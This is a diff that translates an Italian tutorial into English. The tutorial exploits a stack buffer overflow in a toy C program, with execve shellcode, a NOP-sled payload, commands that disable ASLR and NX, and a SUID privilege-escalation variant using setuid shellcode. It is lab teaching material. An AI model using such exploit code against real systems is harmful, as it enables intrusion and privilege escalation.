@@ -2,7 +2,7 @@
 
 # Part 1
 
-Programma vulnerabile
+Vulnerable program
 
 ```c
 #include <stdio.h>
@@ -23,41 +23,42 @@ int main(int argc, char *argv[]) {
 }
 ```
 
-La vulnerabilità risiede nella funzione `strcpy(buffer, input)`, dove l'input dell'utente viene copiato nel buffer locale senza alcun controllo sulla lunghezza. Questo permette all'utente di fornire un input più lungo di 64 byte, causando un *overflow* dello stack. Tale condizione può essere sfruttata per sovrascrivere il valore del registro di ritorno (`ret`) e dirottare l’esecuzione del programma. 
+The vulnerability is in the `strcpy(buffer, input)` function, where the user's input is copied into the local buffer without any check on the length. This allows the user to provide an input longer than 64 bytes, causing a stack *overflow*. This condition can be exploited to overwrite the return address (`ret`) and redirect the program's execution. 
 
-Ad esempio per eseguire una *shellcode*.
+For example, to run a *shellcode*.
 
-## Calcolo dell’offset
+## Offset Calculation
 
-Per poter sovrascrivere correttamente il valore di `ret`, è necessario conoscere la disposizione della memoria sullo stack.
+To correctly overwrite the value of `ret`, it is necessary to understand the memory layout on the stack.
 
 ![image.png](.image.png)
 
-Come da immagine lo stack cresce dal altro verso il basso delle memoria, quindi per sovrascrivere il registro di ritorno `ret` dobbiamo calcolare quanti bytes distano dal primo indirizzo del buffer fino al `ret`.
+As shown in the image, the stack grows from high to low memory addresses. So, to overwrite the return register `ret`, we need to calculate how many bytes separate the beginning of the buffer from `ret`.
 
-Sapendo che per ogni elemento del `char* buffer[64]` occupa 1 byte e che il registro`sfp`o `brp`, che punta all’inizio dello stack (primo elemento), occupa 8 bytes. 
-Quindi facendo i calcoli per sovrascrivere `ret` dobbiamo spostarci di:
+Knowing that each element of the `char buffer[64]` occupies 1 byte, and that the `sfp` or `rbp` register, which points to the base of the stack frame (just before `ret`), occupies 8 bytes:
 
-- 64 byte di `buffer`
-- 8 byte di `SFP` (registro `rbp` salvato)
+So, to reach and overwrite `ret`, we need to go through:
 
-Totale: 64 + 8 = 72 byte.
+- 64 bytes for the `buffer`
+- 8 bytes for the `SFP` (saved `rbp` register)
 
-Questo significa che l’offset necessario per raggiungere  e sovrascrivere il registro di ritorno `ret` è **72 byte** rispetto a Buffer.
+Total: 64 + 8 = 72 bytes.
 
-## Creazione del Payload
+This means the offset needed to reach and overwrite the return register `ret` is **72 bytes** from the start of the buffer.
 
-Per sfruttare questa vulnerabilità, dobbiamo creare un **payload**.
+## Payload Creation
 
-Un **payload** è la parte dell’input che viene iniettata nello stack (o in un'altra zona della memoria) per forzare il programma a eseguire un'azione non prevista, come ad esempio l’avvio di una shell.
+To exploit this vulnerability, we need to create a **payload**.
 
-Nel nostro caso, vogliamo eseguire una **shellcode**, ovvero una sequenza di istruzioni che apre una shell (`/bin/sh`).
+A **payload** is the part of the input that is injected into the stack (or another memory area) to force the program to perform an unintended action, such as launching a shell.
 
-### Scrittura della Shellcode
+In our case, we want to execute a **shellcode**, which is a sequence of instructions that opens a shell (`/bin/sh`).
 
-La shellcode va scritta in **linguaggio assembly**, e poi convertita in **formato esadecimale** per poter essere iniettata all’interno del programma vulnerabile.
+### Writing the Shellcode
 
-L’obiettivo della shellcode sarà invocare la system call `execve("/bin/sh", NULL, NULL)` sulla nostra architettura (x86_64), che ci darà accesso a una shell interattiva.
+The shellcode must be written in **assembly language**, and then converted into **hexadecimal format** so that it can be injected into the vulnerable program.
+
+The goal of the shellcode is to invoke the system call `execve("/bin/sh", NULL, NULL)` on our architecture (x86_64), which will give us access to an interactive shell.
 
 ```c
 unsigned char shellcode[] =
@@ -73,96 +74,97 @@ unsigned char shellcode[] =
   "\x0f\x05";                   // syscall
 ```
 
-Dopo avere sviluppato la shellcode dobbiamo completare la creazione del payload
+After writing the shellcode, we need to complete the creation of the payload:
 
 ```c
 char payload[80];
-//Preparazione payload
+// Payload preparation
 memset(payload, 0x90, sizeof(payload)); // NOP sled
 
-memcpy(payload+16, shellcode, sizeof(shellcode)); // shellcode a offset 16
+memcpy(payload+16, shellcode, sizeof(shellcode)); // shellcode at offset 16
 ```
 
-In questo frammento di codice
+In this code snippet:
 
-- Inizializziamo un array di 80 byte
-- Lo riempiamo di istruzioni **`nop`**, in esadecimale `0x90` , questa tecnica ci permette di aumentare la probabilità di esecuzione della nostra shellcode anche se magari l’indirizzo di ritono non è preciso al byte
-- Inseriamo la shellcode all’interno del buffer, a partire da un certo offset (in questo caso 16), per evitare problemi di allineamento o di corruzione dei dati.
+- We initialize an array of 80 bytes.
+- We fill it with **`nop`** instructions, in hexadecimal `0x90`. This technique, known as a **NOP sled**, increases the chances that the program will land somewhere before the shellcode and slide into it, even if the return address is not exact to the byte.
+- We insert the shellcode into the buffer starting at a certain offset (in this case 16), to avoid alignment issues or data corruption.
 
-### Sovrascrivere l’indirizzo di ritorno
+### Overwriting the Return Address
 
-Ora dobbiamo completare il payload aggiungendo, alla fine, un indirizzo che sovrascriva il **return address** (registro `ret`) della funzione. Questo indirizzo deve puntare a una zona del payload dove è presente la shellcode (oppure dentro il NOP sled).
+Now we need to complete the payload by adding, at the end, an address that overwrites the **return address** (`ret` register) of the function. This address must point to a location in the payload where the shellcode is present (or inside the NOP sled).
 
 ```c
-void *ret_addr = (void*)(0x7fffffffecc0 + 2); // Puntiamo alla shellcode (con piccolo offset)
-memcpy(payload + 72, &ret_addr, 8); // Sovrascriviamo RIP dopo 72 byte
+void *ret_addr = (void*)(0x7fffffffecc0 + 2); // Pointing to the shellcode (with small offset)
+memcpy(payload + 72, &ret_addr, 8); // Overwriting RIP after 72 bytes
 ```
 
-- `0x7fffffffecc0` Rappresenta l’indirizzo di partenza del buffer (ottenuto tramite gdb), aggiungiamo un offset di `+2` per essere sicuri di atterrare dentro al NOP o direttamente nella shellcode.
-- `memcpy(payload + 72, &ret_addr, 8)` sovrascrive gli 8 byte del return address con il nostro indirizzo, in modo che al termine della funzione venga eseguita la shellcode.
+- `0x7fffffffecc0` represents the starting address of the buffer (obtained via gdb). We add an offset of `+2` to make sure we land inside the NOP sled or directly on the shellcode.
+- `memcpy(payload + 72, &ret_addr, 8)` overwrites the 8 bytes of the return address with our crafted address, so that when the function ends, execution jumps to the shellcode.
 
 ---
 
-**Recupero del indirizzo del Buffer:**
+**Getting the Buffer Address:**
 
-Per individuare l’idirizzo del buffer, avviamo il nostro programma vulnerabile con gdb andiamo a individuare l’indirizzo di memoria dell’buffer, con l’utilizzo del comando `p &buffer`
+To find the address of the buffer, we start our vulnerable program with `gdb` and locate the buffer’s memory address using the command `p &buffer`.
 
 ![image.png](.image%201.png)
 
-Per farlo in questo caso dobbiamo per dobbiamo disattivare la protezione ASRL del kernel, che
+In this case, we need to **disable kernel protections** in order to make the address of the buffer predictable and prevent randomization mechanisms like **ASLR (Address Space Layout Randomization)** from changing it each time we run the program.
 
 ---
 
-### Disattivazione delle Protezioni del Sistema
+### Disabling System Protections
 
-Per permettere al nostro exploit di funzionare correttamente, dobbiamo disabilitare alcune protezioni di sicurezza attive nei sistemi moderni.
+To ensure our exploit works correctly, we need to disable some security protections that are active on modern systems.
 
-- **ASLR (Address Space Layout Randomization)**
-    
-    Per far sì che l'indirizzo dell buffer, quindi della shellcode,  sia sempre lo stesso (e quindi l'exploit funzioni in modo deterministico), dobbiamo disattivare la protezione **ASLR** (*Address Space Layout Randomization*). Questa protezione, infatti, cambia gli indirizzi di memoria ad ogni esecuzione del programma.
-    
-    ```bash
-    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
-    ```
-    
-- **NX (No-eXecute)**
-    
-    La **protezione NX** impedisce l’esecuzione di codice nelle aree di memoria marcate come dati, come ad esempio lo **stack**. Poiché noi stiamo iniettando la shellcode nello stack, dobbiamo disabilitare anche questa protezione. 
-    Per farlo bisogna compilare il programma vulnerabile con il seguente comando, disablitando le protezioni del compilatore
-    
-    ```bash
-    gcc -fno-stack-protector -z execstack vuln.c -o vuln
-    ```
-    
+- **ASLR (Address Space Layout Randomization)**  
+   
+   To make sure the buffer’s address — and therefore the shellcode’s address — stays the same on every run (so the exploit works reliably), we need to disable **ASLR**. This protection randomizes memory addresses every time the program is executed.
+
+   ```bash
+   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+   ```
+
+- **NX (No-eXecute)**  
+
+   The **NX protection** prevents code execution in memory regions marked as data, such as the **stack**. Since we are injecting the shellcode into the stack, we also need to disable this protection.  
+   To do this, we compile the vulnerable program with the following command, disabling compiler-based protections:
+
+   ```bash
+   gcc -fno-stack-protector -z execstack vuln.c -o vuln
+   ```
 
 ---
 
-## Avvio del programma vulnerabile tramite exploit
+## Launching the Vulnerable Program via Exploit
 
-Arrivati a questo punto con il nostro payload completo e con tutte le protezioni disabilitate, possiamo eseguire il nostro programma vulnerabile tramite l’exploit.
+At this point, with our payload fully crafted and all protections disabled, we can execute the vulnerable program using our exploit.
 
-Possiamo farlo tramite una chiamata a `execve()`, che esegue il binario passando il nostro payload come argomento:
+This can be done by making a call to `execve()`, which runs the binary and passes our payload as an argument:
 
 ```c
-    char *args[] = {"./vuln", payload, NULL};
-    execve("./vuln", args, NULL);
-    perror("execve");  //Se fallisce, stampa errore
+char *args[] = {"./vuln", payload, NULL};
+execve("./vuln", args, NULL);
+perror("execve");  // If it fails, print error
 ```
 
-- `args` è un array di puntatori che contiene il nome del programma (`"./vuln"`) e il nostro `payload`
+- `args` is an array of pointers that includes the program name (`"./vuln"`) and our `payload` as arguments.  
 
 ---
 
-## Avvio del exploit
+## Launching the Exploit
 
-Compiliamo e avviamo l’exploit.
+We compile and run the exploit with the following commands:
 
 ```bash
 gcc -fno-stack-protector -z execstack exploit.c -o exploit
 ./exploit
 ```
 
-## Codice completo
+If everything is set up correctly, this should result in the execution of a shell (`/bin/sh`) spawned by the shellcode.
+
+## Full Code
 
 ```c
 #include <stdio.h>
@@ -205,23 +207,22 @@ int main() {
 }
 
 ```
+# Part 2 - Exploit with SUID
 
-# Part 2 - Exploit con SUID
+Now we want to exploit the vulnerability of the program with the **SUID bit enabled**, to inherit the permissions of the file's owner.
 
-Adesso volgiamo sfruttare la vulnerabilità del programma con il **bit SUID attivo,** ereditare i permessi del proprietario del file
+### SUID (**Set owner User ID upon execution)**
 
-### SUID (**Set owner User ID up on execution)**
+The **SUID (Set User ID)** bit is a flag that can be set on an executable file. When a program with SUID enabled is executed, the process takes on the **permissions of the file’s owner**, instead of those of the user running it.
 
-Il **bit SUID (Set User ID)** è un flag che può essere applicato a un file eseguibile. Quando un programma con SUID attivo viene eseguito, il processo assume i **permessi del proprietario del file**, anziché quelli dell'utente che lo lancia.
+## Modifying the Shellcode to Keep the Privileges
 
-## Modifica della Shellcode per mantenere i privilegi
+To do this, we just need to modify the shellcode by adding the function call `setuid(geteuid())`.
 
-Per fare ciò dobbiamo solamente modificare la shellcode utilizzando la chiamata a funzione `setuid(geteuid())`
+This call ensures that the current process has the same UID and EUID, keeping the privileges of the SUID binary.
 
-Questa chiamata assicura che il processo attivo abbia UID ed EUID uguali, mantenendo i privilegi del binario con SUID.
-
-Per scrivere la shellcode, dobbiamo utilizzare le chiamate sycall, consultando il sito [https://x64.syscall.sh/](https://x64.syscall.sh/) 
-Questo sito fornisce l'elenco completo delle syscall per Linux in architettura 64 bit.
+To write the shellcode, we need to use syscalls, by checking the site [https://x64.syscall.sh/](https://x64.syscall.sh/)  
+This site provides the full list of syscalls for Linux on 64-bit architecture.
 
 ```nasm
 ;geteuid()
@@ -247,11 +248,11 @@ Questo sito fornisce l'elenco completo delle syscall per Linux in architettura 6
     syscall
 ```
 
-- Prima **ottengo** l’EUID (con `geteuid()`), che è il vero ID del proprietario del processo.
-- Poi uso `setuid()` per dire al sistema: "voglio usare questi privilegi come UID reale".
-- Infine lancio `/bin/sh`.
+- First, I **get** the EUID (with `geteuid()`), which is the real ID of the process owner.  
+- Then I use `setuid()` to tell the system: "I want to use this privilege as my real UID."  
+- Finally, I launch `/bin/sh`.
 
-Convertito in esadecimale diventa
+Converted into hexadecimal, it becomes:
 
 ```c
 unsigned char shellcode[] =
@@ -274,7 +275,7 @@ unsigned char shellcode[] =
   "\x0f\x05";             // syscall
 ```
 
-Quindi il codice completo è: (rimane idendito a parte la nuova shellcode) 
+So the complete code is: (identical except for the updated shellcode)
 
 ```c
 #include <stdio.h>
